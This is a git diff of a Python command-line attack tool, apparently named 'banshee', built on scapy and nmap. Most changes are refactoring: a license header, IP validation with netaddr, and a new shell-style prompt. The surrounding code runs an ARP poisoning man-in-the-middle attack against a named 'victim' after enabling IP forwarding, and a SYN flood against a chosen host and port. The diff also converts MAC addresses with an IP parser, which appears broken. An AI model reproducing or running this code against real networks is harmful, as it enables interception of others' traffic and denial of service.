@@ -1,4 +1,15 @@
 #!/usr/bin/env python
+######################################
+#
+#   Author: mtarsel
+#
+#   PACKAGES INCLUDE: 
+#	python-nmap, nfeque, scapy, netaddr
+#
+#   LICENSE: GPL v2
+#
+######################################
+
 import socket, random, sys, threading
 import cmd
 import logging
@@ -7,14 +18,9 @@ from scapy.all import *
 import nmap   
 import time
 from subprocess import call
+from netaddr import *
+import getpass
 
-
-#Long term:
-#   1. ARP or MITM working
-#   2. put in virtualenv, test with different python versions, make requirements.txt
-
-#https://pypi.python.org/pypi/netaddr/ TODO
-#PACKAGES INCLUDE list cmd2, python-nmap, nfeque, scapy TODO
 
 clientsList = [ ]
 global myip
@@ -94,7 +100,9 @@ class CLI(cmd.Cmd):
 
     def __init__(self):
         cmd.Cmd.__init__(self)
-        self.prompt = '> '
+	#username = getpass.getuser()
+	hostname = socket.gethostname()
+        self.prompt = 'banshee@' + hostname + '~#'
         
         
 
@@ -160,11 +168,11 @@ class CLI(cmd.Cmd):
 	    print "No ip entered"
 	else:
 	    print "\nPinging... ",arg,"\n"
-	    ip_target = arg 
+	    pingIP = str(IPAddress(arg))
 	    data = "Space for Rent!"
 	    ip = IP()
 	    icmp = ICMP()
-	    ip.dst = ip_target
+	    ip.dst = pingIP
 	    icmp.type = 8
 	    icmp.code = 0
 	    a = sr1(ip/icmp/data)
@@ -206,11 +214,11 @@ class CLI(cmd.Cmd):
 		ipf.write('1\n')#enable IP forwarding with '1'     
 	    #signal.signal(signal.SIGINT, signal_handler)
 	    
-	
-	    routerIP = arplist[0]
-	    victimIP = arplist[1]	    
-	    routerMAC = arplist[2]	    
-	    victimMAC = arplist[3]
+	    routerIP = str(IPAddress(arplist[0]))
+	    victimIP = str(IPAddress(arplist[1]))	    
+	    routerMAC = str(IPAddress(arplist[2]))
+	    victimMAC = str(IPAddress(arplist[3]))
+
 	       
 	    arpAttack = Arp(routerIP, victimIP, routerMAC, victimMAC)       
 
@@ -245,7 +253,7 @@ class CLI(cmd.Cmd):
 
 	    print "\n",arg,"\n"
 	    targetlist = arg.split(" ")
-	    targetip = targetlist[0]	
+	    targetip = str(IPAddress(targetlist[0]))
 	    port = int(targetlist[1])	
 	    print "Flooding %s:%i with SYN packets." % (targetlist[0], port)
 	
@@ -279,7 +287,8 @@ class CLI(cmd.Cmd):
     do_r = do_router
 
 if __name__ == '__main__':
-
+    
+    #Remove Scapy warning about IPv6
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
     if os.geteuid() != 0:
@@ -288,7 +297,6 @@ if __name__ == '__main__':
       
     call(["ip", "address"])#TODO use pip package netifaces?? 
  
-#    print "Please enter network interface:"
     conf.iface = raw_input("\nEnter network interface: ")  
 
     #hackish - ping Google and get our IP
@@ -301,5 +309,5 @@ if __name__ == '__main__':
     s.close()
 
     print"\n Type 'help' \n"
-    cli = CLI()
-    cli.cmdloop() 
+    cli = CLI()#define cmd Object
+    cli.cmdloop() #begin infinite loop
